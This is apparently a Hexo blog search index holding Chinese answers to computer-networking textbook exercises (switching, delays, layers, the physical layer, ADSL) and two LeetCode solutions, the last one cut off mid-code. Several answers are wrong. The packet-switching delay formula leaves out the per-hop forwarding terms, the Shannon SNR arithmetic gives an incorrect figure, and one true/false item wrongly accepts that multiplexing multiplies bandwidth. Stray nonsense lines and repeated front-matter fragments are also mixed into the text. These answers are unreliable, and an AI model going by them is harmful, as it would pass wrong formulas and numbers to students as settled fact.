<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>习题</title>
      <link href="/2024/12/30/%E4%B9%A0%E9%A2%98/"/>
      <url>/2024/12/30/%E4%B9%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="p-31"><a href="#p-31" class="headerlink" title="p 31"></a>p 31</h2><h3 id="2-简述分组交换的要点"><a href="#2-简述分组交换的要点" class="headerlink" title="2. 简述分组交换的要点"></a>2. 简述分组交换的要点</h3><p>分组交换是计算机网络中的一种数据传输方式，主要特点包括：</p><ul><li><strong>数据分组传输</strong>：将数据分成多个小的分组，每个分组独立传输，带有源地址和目的地址。</li><li><strong>路径动态选择</strong>：每个分组可以根据网络状况选择不同的路径到达目的地，而不需要所有分组走相同的路径。</li><li><strong>无连接传输</strong>：不需要事先建立连接，分组可以独立传输，无需预留网络资源。</li><li><strong>资源共享</strong>：不同的分组可以共享网络带宽，有效利用网络资源，适合多用户、多任务环境。</li><li><strong>拥塞控制</strong>：网络节点通过缓存存储分组来控制流量，缓解网络拥塞。</li><li><strong>失序及恢复</strong>：由于不同分组可能经过不同路径，可能会失序到达目的地，目的节点需要将分组按顺序重新组装。</li></ul><hr><h3 id="3-分组交换与电路交换的比较"><a href="#3-分组交换与电路交换的比较" class="headerlink" title="3. 分组交换与电路交换的比较"></a>3. 分组交换与电路交换的比较</h3><div class="table-container"><table><thead><tr><th>特性</th><th>分组交换</th><th>电路交换</th></tr></thead><tbody><tr><td><strong>建立连接</strong></td><td>无需预先建立连接</td><td>需要预先建立连接</td></tr><tr><td><strong>传输路径</strong></td><td>每个分组路径可能不同，动态选择</td><td>固定路径，整个通信期间使用相同路径</td></tr><tr><td><strong>何时需要地址</strong></td><td>每个分组都需要携带源地址和目的地址</td><td>建立连接时指定源地址和目的地址</td></tr><tr><td><strong>是否独占链路</strong></td><td>否，不独占链路，多个用户可以共享同一链路</td><td>是，链路为独占资源，整个会话期间专用</td></tr><tr><td><strong>网络拥塞</strong></td><td>容易发生拥塞，必须通过拥塞控制机制缓解</td><td>拥塞较少，因为链路是预分配的</td></tr><tr><td><strong>数据是否会失序</strong></td><td>分组可能失序，需要重新排序</td><td>数据传输不会失序</td></tr><tr><td><strong>端到端时延的确定性</strong></td><td>时延不确定，依赖于网络状况和拥塞程度</td><td>时延确定，因为资源是固定预留的</td></tr><tr><td><strong>适用的数据传输类型</strong></td><td>适用于数据包传输、突发性数据传输</td><td>适用于实时传输，如语音或视频</td></tr></tbody></table></div><hr><h3 id="5-联网的发展大致分为哪几个阶段？请指出这几个阶段最主要的特点。"><a href="#5-联网的发展大致分为哪几个阶段？请指出这几个阶段最主要的特点。" class="headerlink" title="5. 联网的发展大致分为哪几个阶段？请指出这几个阶段最主要的特点。"></a>5. 联网的发展大致分为哪几个阶段？请指出这几个阶段最主要的特点。</h3><ol><li><p><strong>初期阶段（1960 s - 1970 s）</strong>：</p><ul><li>计算机网络的研究开始，早期网络如 ARPANET、ALOHA 网络诞生。</li><li>主要用于科学研究和军事目的，重点在于基础连接和数据传输的可行性。</li></ul></li><li><p><strong>标准化与扩展阶段（1980 s - 1990 s）</strong>：</p><ul><li>TCP/IP 协议成为网络的标准，互联网开始逐渐成型并推广。</li><li>局域网（LAN）和广域网（WAN）技术发展，个人计算机和服务器网络连接普及。</li></ul></li><li><p><strong>互联网普及阶段（1990 s - 2000 s）</strong>：</p><ul><li>万维网（WWW）的诞生和推广推动了互联网的广泛使用。</li><li>商业应用、电子邮件、即时通讯、电子商务等网络服务迅速发展。</li></ul></li><li><p><strong>高速网络与移动互联网阶段（2000 s - 2010 s）</strong>：</p><ul><li>宽带网络和移动互联网兴起，网络带宽和速度显著提升。</li><li>移动设备接入网络成为主流，网络应用多样化，视频、云计算、社交网络大规模普及。</li></ul></li><li><p><strong>智能网络与物联网阶段（2010 s 至今）</strong>：</p><ul><li>5 G 技术、物联网（IoT）、云计算、人工智能与网络深度结合。</li><li>网络应用向智能化、自动化方向发展，物理世界与数字世界进一步融合。</li></ul></li></ol><hr><h3 id="8-计算机网络的类别及特点"><a href="#8-计算机网络的类别及特点" class="headerlink" title="8. 计算机网络的类别及特点"></a>8. 计算机网络的类别及特点</h3><ol><li><p><strong>局域网（LAN，Local Area Network）</strong>：</p><ul><li>通常覆盖一个小范围的地理区域，如办公室、校园。</li><li>高速传输，低延迟，网络稳定。</li><li>主要用于连接办公室内的计算机、打印机等设备。</li></ul></li><li><p><strong>城域网（MAN，Metropolitan Area Network）</strong>：</p><ul><li>覆盖一个城市或市区，连接多个局域网。</li><li>传输速度适中，通常用于政府、企业、大学校园等大规模网络部署。</li></ul></li><li><p><strong>广域网（WAN，Wide Area Network）</strong>：</p><ul><li>覆盖大范围的地理区域，如国家、洲际网络。</li><li>速度较慢，延迟较大，通常使用公用电信网络或卫星通信。</li></ul></li><li><p><strong>个人区域网（PAN，Personal Area Network）</strong>：</p><ul><li>通常是个体用户在个人范围内使用的网络，如蓝牙、红外线通信。</li><li>覆盖范围小，传输距离短，适合个人设备间的数据共享和通信。</li></ul></li><li><p><strong>全球网（GAN，Global Area Network）</strong>：</p><ul><li>连接世界各地的网络，形成全球互联，如互联网。</li><li>网络规模最大，覆盖全球，传输距离远，但可能受网络拥塞影响。</li></ul></li></ol><hr><h3 id="9-联网的两大组成部分（边缘部分与核心部分）的特点及工作方式"><a href="#9-联网的两大组成部分（边缘部分与核心部分）的特点及工作方式" class="headerlink" title="9. 联网的两大组成部分（边缘部分与核心部分）的特点及工作方式"></a>9. 联网的两大组成部分（边缘部分与核心部分）的特点及工作方式</h3><ol><li><p><strong>边缘部分（Edge）</strong>：</p><ul><li>由终端用户设备（如计算机、手机）和接入网络的设备（如路由器、交换机）组成。</li><li>工作特点：负责处理用户数据的产生、消费和初步传输，直接与用户互动，涉及数据的封装与传输。</li><li>主要任务是数据的发送、接收、封装、拆封，用户与网络的接口。</li></ul></li><li><p><strong>核心部分（Core）</strong>：</p><ul><li>由大型交换机和路由器组成，形成高容量、高速传输的骨干网络。</li><li>工作特点：负责高效传输和路由选择，保证不同网络间的数据传输与交换。</li><li>主要任务是高效转发数据包，提供高速的数据传输路径，确保不同网络的互联互通。</li></ul></li></ol><hr><h3 id="10-电路交换与分组交换传送报文的时延比较"><a href="#10-电路交换与分组交换传送报文的时延比较" class="headerlink" title="10. 电路交换与分组交换传送报文的时延比较"></a>10. 电路交换与分组交换传送报文的时延比较</h3><p>假设要传送的报文共有 x（bit），从源点到终点经过 k 段链路，每段链路的传播时延为 d（秒），数据传输速率为 b（bit/s）。在电路交换时电路建立时间为 s（秒），分组交换时分组长度为 p（bit），且 x &gt; p，各节点的排队等待时间忽略不计。</p><ul><li><p><strong>电路交换的总时延</strong></p><p>$T_{\text{电路交换}} = s + \frac{x}{b} + k \cdot d$</p><p>其中，( s ) 为电路建立时间，( \frac{x}{b} ) 为传输报文所需时间，( k \cdot d ) 为传播时延。</p></li><li><p><strong>分组交换的总时延</strong>：</p><p>$T_{\text{分组交换}} = \frac{x}{b} + (k \cdot d)$</p><p>每段链路都会进行分组转发，每个分组的传播时延为 ( d )，而传输时间取决于总数据量和分组长度。</p></li></ul><p>因此，当 ( s &gt; 0 )，即电路建立时间较长时，分组交换的时延可能小于电路交换的时延。</p><hr><h3 id="13-计算机网络的常用性能指标"><a href="#13-计算机网络的常用性能指标" class="headerlink" title="13. 计算机网络的常用性能指标"></a>13. 计算机网络的常用性能指标</h3><ul><li><strong>带宽</strong>：指网络中单位时间内传输的数据量，通常以比特每秒（bps）为单位。</li><li><strong>时延</strong>：指数据从发送方传送到接收方所需的时间，包括发送时延、传播时延、排队时延和处理时延。</li><li><strong>吞吐量</strong>：网络在单位时间内成功传送的数据量。</li><li><strong>丢包率</strong>：指网络中丢失的数据包比例，影响网络的可靠性。</li><li><strong>延迟抖动</strong>：指数据包到达接收方的时间间隔波动大小，通常影响实时通信的质量。</li></ul><hr><h3 id="14-计算发送时延和传播时延"><a href="#14-计算发送时延和传播时延" class="headerlink" title="14. 计算发送时延和传播时延"></a>14. 计算发送时延和传播时延</h3><p>信号传播速率为 ( 2 \times 10^8 ) 米/秒，传输距离为 1000 公里（即 ( 10^6 ) 米）。</p><ol><li><p><strong>情况 1</strong>：数据长度为 ( 10^3 ) bit，发送速率为 100 kbit/s。</p><ul><li><p><strong>发送时延</strong>：</p><p>$T_{\text{发送}} = \frac{10^3 \text{ bit}}{100 \times 10^3 \text{ bit/s}} = 0.01 \text{ 秒}$</p></li><li><p><strong>传播时延</strong>：<br>$T_{\text{传播}} = \frac{10^6 \text{ 米}}{2 \times 10^8 \text{ 米/秒}} = 0.005 \text{ 秒}$</p></li></ul></li><li><p><strong>情况 2</strong>：数据长度为 ( 10^3 ) bit，发送速率为 1 Gbit/s。</p><ul><li><p><strong>发送时延</strong>：</p><p>$T_{\text{发送}} = \frac{10^3 \text{ bit}}{1 \times 10^9 \text{ bit/s}} = 10^{-6} \text{ 秒}$</p></li><li><p><strong>传播时延</strong>：</p><p>$T_{\text{传播}} = 0.005 \text{ 秒}$</p></li></ul></li></ol><p><strong>结论</strong>：传播时延只与物理距离有关，而与发送速率无关；发送速率越高，发送时延越小。</p><hr><h3 id="15-网络体系结构为什么要采用分层次的结构？"><a href="#15-网络体系结构为什么要采用分层次的结构？" class="headerlink" title="15. 网络体系结构为什么要采用分层次的结构？"></a>15. 网络体系结构为什么要采用分层次的结构？</h3><ul><li><strong>简化设计与实现</strong>：分层结构可以将复杂的网络功能拆分为更简单的、独立的模块，各层独立设计，彼此之间只通过接口通信。</li><li><strong>易于扩展与维护</strong>：修改一层的功能不会影响其他层，可以方便地扩展和升级网络。</li><li><strong>模块化设计</strong>：各层分工明确，每一层实现特定的功能，如物理层负责传输信号，传输层负责数据可靠传输。</li></ul><p>类似的分层设计可在日常生活中看到，如建筑物的层次结构、电器设备的模块化设计等。</p><hr><h3 id="16-协议与服务的区别及关系"><a href="#16-协议与服务的区别及关系" class="headerlink" title="16. 协议与服务的区别及关系"></a>16. 协议与服务的区别及关系</h3><ul><li><strong>协议</strong>：是一组规则，定义了通信双方在传输数据时如何进行数据交换。协议规定了数据格式、传输方式、错误处理等。</li><li><strong>服务</strong>：是协议为上层提供的一种功能，定义了数据传输和处理的方式。服务可以看作协议对上层应用提供的接口。</li></ul><p><strong>关系</strong>：协议是实现服务的手段，服务依赖协议来实现具体的功能。</p><hr><h3 id="17-具有-5-层协议的网络体系结构的要点"><a href="#17-具有-5-层协议的网络体系结构的要点" class="headerlink" title="17. 具有 5 层协议的网络体系结构的要点"></a>17. 具有 5 层协议的网络体系结构的要点</h3><ol><li><strong>物理层</strong>：负责比特的传输，定义硬件接口、信号的电气特性、传输介质等。</li><li><strong>数据链路层</strong>：负责点到点的可靠数据传输，解决传输错误和流量控制问题。</li><li><strong>网络层</strong>：负责路由选择和分组转发，确保数据能从源端传送到目的端。</li><li><strong>传输层</strong>：提供端到端的可靠数据传输服务，负责数据的分段、重组和错误恢复。</li><li><strong>应用层</strong>：直接为用户提供服务，如 HTTP、FTP、SMTP 等，支持用户与网络的交互。</li></ol><hr><h3 id="18-试解释以下名词：协议栈、实体、对等层、协议数据单元。"><a href="#18-试解释以下名词：协议栈、实体、对等层、协议数据单元。" class="headerlink" title="18. 试解释以下名词：协议栈、实体、对等层、协议数据单元。"></a>18. 试解释以下名词：协议栈、实体、对等层、协议数据单元。</h3><ul><li><strong>协议栈</strong>：网络协议按照不同的功能层次组成的协议组合，通常是纵向的层次结构。</li><li><strong>实体</strong>：在网络通信中，每一层的参与通信的对象称为实体，可以是软件进程、硬件设备等。</li><li><strong>对等层</strong>：处于不同机器中相同层次的实体之间的通信关系，称为对等层。</li><li><strong>协议数据单元（PDU, Protocol Data Unit）</strong>：每一层在传输过程中所处理的数据单元，各层的 PDU 不同，如网络层的 PDU 为 IP 分组。</li></ul><hr><h3 id="20-判断以下说法的正误"><a href="#20-判断以下说法的正误" class="headerlink" title="20. 判断以下说法的正误"></a>20. 判断以下说法的正误</h3><ol><li><p><strong>提高链路速率意味着降低了信道的传播时延</strong>。</p><ul><li>错误。传播时延取决于物理介质和信号传播速度，与链路速率无关。</li></ul></li><li><p><strong>在链路上产生的传播时延与链路的带宽无关</strong>。</p><ul><li>正确。传播时延取决于信号在介质中的传播速度，与带宽无关。</li></ul></li><li><p><strong>跨越网络提供主机到主机的数据通信属于运输层的功能</strong>。</p><ul><li>错误。这属于网络层的功能，传输层提供端到端的可靠传输。</li></ul></li><li><p><strong>发送时延是分组的第一个比特从发送方发出到该比特到达接收方所用的时间</strong>。</p><ul><li>错误。发送时延是发送方将所有比特推送到链路所需的时间，而不是比特到达接收方的时间。</li></ul></li><li><p><strong>由于动态分配通信带宽和其他通信资源，分组交换能更好更高效地共享资源</strong>。</p><ul><li>正确。分组交换通过动态分配带宽，可以有效提高资源利用率。</li></ul></li><li><p><strong>采用分组交换在发送数据前可以不必先建立连接，发送突发数据更迅速，因此不会出现网络拥塞</strong>。</p><ul><li>错误。虽然分组交换不需要建立连接，但在高流量情况下仍可能出现网络拥塞。</li></ul></li></ol><h2 id="p-61"><a href="#p-61" class="headerlink" title="p 61"></a>p 61</h2><h3 id="1-物理层要解决的问题"><a href="#1-物理层要解决的问题" class="headerlink" title="1. 物理层要解决的问题"></a>1. 物理层要解决的问题</h3><p>物理层主要解决以下几个问题：</p><ul><li><strong>信号的传输</strong>：负责将比特流转换为电信号、光信号或其他形式的信号并在传输媒体中传输。</li><li><strong>传输介质</strong>：选择和定义适合的传输介质（如光纤、铜线、无线信道等）。</li><li><strong>信号特性</strong>：定义信号的电气特性（如电压、电流、频率等）以及信号的编码方式。</li><li><strong>数据速率</strong>：确定数据传输的速率和带宽要求。</li><li><strong>同步</strong>：确保发送方和接收方在时间上同步，以正确地解释信号。</li><li><strong>传输模式</strong>：定义传输模式（串行或并行传输）和信号的时序特性。</li></ul><hr><h3 id="3-物理层规定的接口特性"><a href="#3-物理层规定的接口特性" class="headerlink" title="3. 物理层规定的接口特性"></a>3. 物理层规定的接口特性</h3><p>物理层规定了传输设备与传输媒体之间接口的以下特性：</p><ul><li><strong>电气特性</strong>：定义信号的电压、电流、频率等参数。</li><li><strong>机械特性</strong>：描述连接器的物理形状、尺寸和接头类型。</li><li><strong>功能特性</strong>：说明信号的发送和接收过程，以及数据编码、调制等功能。</li><li><strong>规程特性</strong>：规定操作信号的规则，例如时钟同步和数据流控制。</li></ul><hr><h3 id="4-数据通信系统模型及组成构件"><a href="#4-数据通信系统模型及组成构件" class="headerlink" title="4. 数据通信系统模型及组成构件"></a>4. 数据通信系统模型及组成构件</h3><p>数据通信系统模型通常包括以下几个主要组成部分：</p><ul><li><strong>数据源</strong>：产生数据的设备或用户，负责生成需要传输的信息。</li><li><strong>发送设备</strong>：将数据转换为可传输信号的设备，如调制解调器（modem）。</li><li><strong>传输媒介</strong>：数据传输所使用的物理介质，如电缆、光纤、无线信道等。</li><li><strong>接收设备</strong>：将传输信号转换回数据的设备，如调制解调器。</li><li><strong>数据目的地</strong>：接收并处理数据的终端设备或用户。</li></ul><p>这些组件共同工作，实现数据从源头到目的地的有效传输。</p><hr><h3 id="5-数据流-1010-0-011-的编码波形"><a href="#5-数据流-1010-0-011-的编码波形" class="headerlink" title="5. 数据流 1010 0 011 的编码波形"></a>5. 数据流 1010 0 011 的编码波形</h3><p>下面是不同编码方式下的数据流 <code>1010 0 011</code> 的波形示例（从高电平开始）：</p><hr><h3 id="8-信道的信噪比计算"><a href="#8-信道的信噪比计算" class="headerlink" title="8. 信道的信噪比计算"></a>8. 信道的信噪比计算</h3><p>要传送的数据速率为 ( R = 64 ) kbit/s，带宽为 ( B = 3 ) kHz。</p><p>使用香农定律：</p><p>$C = B \cdot \log_2 (1 + \text{SNR})$</p><p>其中 $( C )$ 是信道容量，$(\text{SNR})$ 是信噪比。</p><p>首先，求信道容量：</p><p>$C = 3000 \cdot \log_2 (1 + \text{SNR}) \geq 64,000 \text{ bps}$</p><p>$\log_2 (1 + \text{SNR}) \geq \frac{64,000}{3000} \approx 21.33$</p><p>根据对数的特性：</p><p>$1 + \text{SNR} \geq 2^{21.33} \approx 2,325,680$</p><p>$\text{SNR} \geq 2,325,680 - 1 \approx 2,325,679$</p><p>因此，这个信道应具有一个极高的信噪比。</p><hr><h3 id="9-试解释以下名词：数据，信号，模拟信号，基带信号，带通信号，数字信号，码元，单工通信，半双工通信，全双工通信，串行传输，并行传输。"><a href="#9-试解释以下名词：数据，信号，模拟信号，基带信号，带通信号，数字信号，码元，单工通信，半双工通信，全双工通信，串行传输，并行传输。" class="headerlink" title="9. 试解释以下名词：数据，信号，模拟信号，基带信号，带通信号，数字信号，码元，单工通信，半双工通信，全双工通信，串行传输，并行传输。"></a>9. 试解释以下名词：数据，信号，模拟信号，基带信号，带通信号，数字信号，码元，单工通信，半双工通信，全双工通信，串行传输，并行传输。</h3><ul><li><strong>数据</strong>：表示信息的符号，通常以二进制形式存储和传输。</li><li><strong>信号</strong>：在物理介质上传输的电气或光学的物理表现，用于承载数据。</li><li><strong>模拟信号</strong>：连续的信号，具有无限的取值范围，通常表示自然界的变化（如声音）。</li><li><strong>基带信号</strong>：未经过调制的信号，直接在物理介质上传输。</li><li><strong>带通信号</strong>：经过调制的信号，通常在特定频率范围内传输。</li><li><strong>数字信号</strong>：离散的信号，通常以二进制表示，有明确的取值。</li><li><strong>码元</strong>：用于数字通信的基本单位，表示特定的信号状态。</li><li><strong>单工通信</strong>：数据只能单向传输的通信方式，如广播。</li><li><strong>半双工通信</strong>：数据可以双向传输，但不能同时进行的通信方式，如对讲机。</li><li><strong>全双工通信</strong>：数据可以双向同时传输的通信方式，如电话通话。</li><li><strong>串行传输</strong>：数据按位逐一传输的方式，节省线路。</li><li><strong>并行传输</strong>：数据多位同时传输的方式，速度快，但需多根线路。</li></ul><hr><h3 id="10-传输媒体类型及特点"><a href="#10-传输媒体类型及特点" class="headerlink" title="10. 传输媒体类型及特点"></a>10. 传输媒体类型及特点</h3><ul><li><p><strong>双绞线</strong>：</p><ul><li>便宜，易于安装。</li><li>抗干扰能力较弱，适用于短距离通信。</li></ul></li><li><p><strong>同轴电缆</strong>：</p><ul><li>带宽大，抗干扰能力强。</li><li>适合长距离传输，但安装较为复杂。</li></ul></li><li><p><strong>光纤</strong>：</p><ul><li>带宽极高，传输距离长。</li><li>抗干扰能力强，适合高速度数据传输。</li></ul></li><li><p><strong>无线信道</strong>：</p><ul><li>无需物理介质，适合移动设备。</li><li>受环境干扰大，传输速度较低。</li></ul></li></ul><hr><h3 id="11-信道复用技术的使用"><a href="#11-信道复用技术的使用" class="headerlink" title="11. 信道复用技术的使用"></a>11. 信道复用技术的使用</h3><p>信道复用技术用于提高传输效率，使多个信号可以在同一物理信道上并行传输，最大限度地利用带宽。常用的信道复用技术有：</p><ul><li><strong>频分复用（FDM）</strong>：将信道分为不同频率段，每个信号占用一个频段。</li><li><strong>时分复用（TDM）</strong>：按时间分配信道，信号轮流在同一频率上传输。</li><li><strong>码分复用（CDM）</strong>：每个信号使用独特的码序列在同一时间、同一频率上传输。</li></ul><hr><h3 id="13-码分多址（CDMA）的优缺点"><a href="#13-码分多址（CDMA）的优缺点" class="headerlink" title="13. 码分多址（CDMA）的优缺点"></a>13. 码分多址（CDMA）的优缺点</h3><p><strong>优点</strong>：</p><ul><li><strong>抗干扰能力强</strong>：使用独特的码序列，可以有效抵抗干扰。</li><li><strong>频谱利用率高</strong>：多个用户可以在同一频带内同时传输，提高带宽利用率。</li><li><strong>安全性高</strong>：难以被截获和干扰。</li></ul><p><strong>缺点</strong>：</p><ul><li><strong>复杂度高</strong>：解码和编码过程复杂，需要更多的处理能力。</li><li><strong>功率控制难</strong>：用户间的功率需要精确控制，以避免干扰。</li><li><strong>邻近信道干扰</strong>：在高密度用户情况下，可能会引起邻近信道干扰。</li></ul><hr><h3 id="15-ADSL、HFC-和-FTTx-接入技术的比较"><a href="#15-ADSL、HFC-和-FTTx-接入技术的比较" class="headerlink" title="15. ADSL、HFC 和 FTTx 接入技术的比较"></a>15. ADSL、HFC 和 FTTx 接入技术的比较</h3><ul><li><p><strong>ADSL（非对称数字用户线）</strong>：</p><ul><li>优点：可以在现有电话线上实现高速数据传输。</li><li>缺点：上行速度较低，距离远时性能下降。</li></ul></li><li><p><strong>HFC（混合光纤同轴电缆）</strong>：</p><ul><li>优点：结合光纤和同轴电缆的优势，支持高速数据传输。</li><li>缺点：受限于同轴电缆的带宽，用户数量增多时速度下降。</li></ul></li><li><p><strong>FTTx（光纤到某处）</strong>：</p><ul><li>优点：提供极高的带宽，适合高速互联网接入。</li><li>缺点：部署成本高，受限于光纤的铺设范围。</li></ul></li></ul><hr><h3 id="16-为什么在-ADSL-技术中，在不到-1-MHz-的带宽中可以传送的速率却可以高达每秒几兆比特？"><a href="#16-为什么在-ADSL-技术中，在不到-1-MHz-的带宽中可以传送的速率却可以高达每秒几兆比特？" class="headerlink" title="16. 为什么在 ADSL 技术中，在不到 1 MHz 的带宽中可以传送的速率却可以高达每秒几兆比特？"></a>16. 为什么在 ADSL 技术中，在不到 1 MHz 的带宽中可以传送的速率却可以高达每秒几兆比特？</h3><p>在 ADSL（非对称数字用户线路）技术中，虽然传输带宽限制在 1 MHz 以下，但它采用了多种先进的调制和信号处理技术，使得在该带宽内能够实现较高的数据传输速率：</p><ol><li><p><strong>多载波调制</strong>：ADSL 使用离散多音频调制（DMT）技术，将可用带宽分成多个小的子载波通道。每个子载波可以独立调制，从而提高整体传输效率。</p></li><li><p><strong>高效的编码和调制方式</strong>：ADSL 使用像 QAM（正交幅度调制）等高效的调制方式，以便在有限的频谱内传输更多的数据。</p></li><li><p><strong>频率分离</strong>：ADSL 将语音和数据传输分开。在同一条电话线上，低频部分用于语音通信，高频部分用于数据传输，从而避免了信号干扰。</p></li><li><p><strong>信道复用</strong>：通过信道复用技术，ADSL 能够在同一物理媒体上同时传输多种信号，提高了带宽的利用率。</p></li></ol><p>这些技术的结合使得 ADSL 能够在不到 1 MHz 的带宽中实现每秒几兆比特的高数据传输速率。</p><p>tags: [计算机网络]<br>title: 习题<br>title: 习题<br>title: 习题<br>title: 习题<br>tags: [计算机网络]<br>title: 习题</p><h2 id="tags-计算机网络"><a href="#tags-计算机网络" class="headerlink" title="tags: [计算机网络]"></a>tags: [计算机网络]</h2><h3 id="17-断以下说法的正误。"><a href="#17-断以下说法的正误。" class="headerlink" title="17. 断以下说法的正误。"></a>17. 断以下说法的正误。</h3><p>（1）<strong>DSL 和电话网拨号接入技术都要通过电话网经过电话交换机连接到 ISP 的路由器。</strong></p><ul><li><strong>正确</strong>。DSL 和拨号接入都需要通过电话网的基础设施进行连接。</li></ul><p>（2）<strong>通过 ADSL 上网的同时可以利用同一条电话线打电话。</strong></p><ul><li><strong>正确</strong>。ADSL 技术允许同时进行数据传输和语音通话，因为它将信号频率分开。</li></ul><p>（3）<strong>双绞线由两根具有绝缘保护层的铜导线按一定密度互相绞在一起组成，这样不容易被拉断。</strong></p><ul><li><strong>正确</strong>。双绞线的结构使得它在一定程度上抵抗外部干扰和物理拉伸，但仍然需要小心处理，以免损坏。</li></ul><p>（4）<strong>信道复用技术可以将多路信号复用到同一条传输线路上进行传输，而不会混淆，因此能使该传输线路的带宽成倍增加。</strong></p><ul><li><strong>正确</strong>。信道复用允许在同一传输媒介上同时传输多个信号，提升了带宽利用率。<br>大多数都是士大夫首发式<br>士大夫随风倒</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>69. x 的平方根</title>
      <link href="/2024/12/30/69.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/"/>
      <url>/2024/12/30/69.%20x%20%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
      
        <content type="html"><![CDATA[<p>给你一个非负整数 <code>x</code> ，计算并返回 <code>x</code> 的 <strong>算术平方根</strong> 。</p><p>由于返回类型是整数，结果只保留 <strong>整数部分</strong> ，小数部分将被 <strong>舍去 。</strong></p><p><strong>注意：</strong> 不允许使用任何内置指数函数和算符，例如 <code>pow(x, 0.5)</code> 或者 <code>x ** 0.5</code> 。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong> x = 4<br><strong>输出：</strong> 2</p><p><strong>示例 2：</strong></p><p><strong>输入：</strong> x = 8<br><strong>输出：</strong> 2<br><strong>解释：</strong> 8 的算术平方根是 2.82842…, 由于返回类型是整数，小数部分将被舍去。</p><p><strong>提示：</strong></p><ul><li><code>0 &lt;= x &lt;= 231 - 1</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mySqrt</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        y=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> y*y &lt; x:</span><br><span class="line"></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> y*y == x:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> y-<span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 力扣题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3138. 同位字符串连接的最小长度</title>
      <link href="/2024/12/30/3138.%20%E5%90%8C%E4%BD%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%9C%80%E5%B0%8F%E9%95%BF%E5%BA%A6/"/>
      <url>/2024/12/30/3138.%20%E5%90%8C%E4%BD%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%9C%80%E5%B0%8F%E9%95%BF%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>给你一个字符串 <code>s</code> ，它由某个字符串 <code>t</code> 和若干 <code>t</code>  的 <strong>同位字符串</strong> 连接而成。</p><p>请你返回字符串 <code>t</code> 的 <strong>最小</strong> 可能长度。</p><p><strong>同位字符串</strong> 指的是重新排列一个单词得到的另外一个字符串，原来字符串中的每个字符在新字符串中都恰好只使用一次。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong>s = “abba”</p><p><strong>输出：</strong>2</p><p><strong>解释：</strong></p><p>一个可能的字符串 <code>t</code> 为 <code>&quot;ba&quot;</code> 。</p><p><strong>示例 2：</strong></p><p><strong>输入：</strong>s = “cdef”</p><p><strong>输出：</strong>4</p><p><strong>解释：</strong></p><p>一个可能的字符串 <code>t</code> 为 <code>&quot;cdef&quot;</code> ，注意 <code>t</code> 可能等于 <code>s</code> 。</p><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 105</code></li><li><code>s</code> 只包含小写英文字母。<h3 id="1-整体思路"><a href="#1-整体思路" class="headerlink" title="1. 整体思路"></a>1. 整体思路</h3></li></ul><p>这个问题的关键在于找到能够重复组成给定字符串<code>s</code>的最小单元字符串<code>t</code>的长度。我们通过尝试不同长度的子串（从长度 1 开始，逐步增加，直到字符串长度本身），检查该长度的子串能否通过重复若干次来构成整个字符串<code>s</code>。如果能找到这样合适的子串长度，那么这个长度就是字符串<code>t</code>的最小可能长度。</p><h3 id="2-代码详细分析"><a href="#2-代码详细分析" class="headerlink" title="2. 代码详细分析"></a>2. 代码详细分析</h3><ul><li><strong>函数定义和参数</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def gcd_str(s):</span><br></pre></td></tr></table></figure><p>定义了一个名为<code>gcd_str</code>的函数，它接受一个字符串<code>s</code>作为参数，目的是找出组成<code>s</code>的最小重复单元字符串的长度。</p><ul><li><strong>遍历可能的长度</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = len(s)</span><br><span class="line">for length in range(1, n + 1):</span><br><span class="line">    if n % length == 0:</span><br></pre></td></tr></table></figure><p>首先获取输入字符串<code>s</code>的长度<code>n</code>，然后使用<code>for</code>循环遍历从 1 到<code>n</code>的所有可能长度（因为最小单元字符串长度可能是 1 到整个字符串长度之间的任何值，只要能整除字符串总长度就行），通过判断<code>n</code>能否被当前长度<code>length</code>整除来确定是否进一步检查该长度是否符合要求（只有能整除总长度的长度才有希望成为最小重复单元的长度）。</p><ul><li><strong>检查子串是否符合要求</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">t = s[:length]</span><br><span class="line">flag = True</span><br><span class="line">for i in range(length, n, length):</span><br><span class="line">    sub_s = 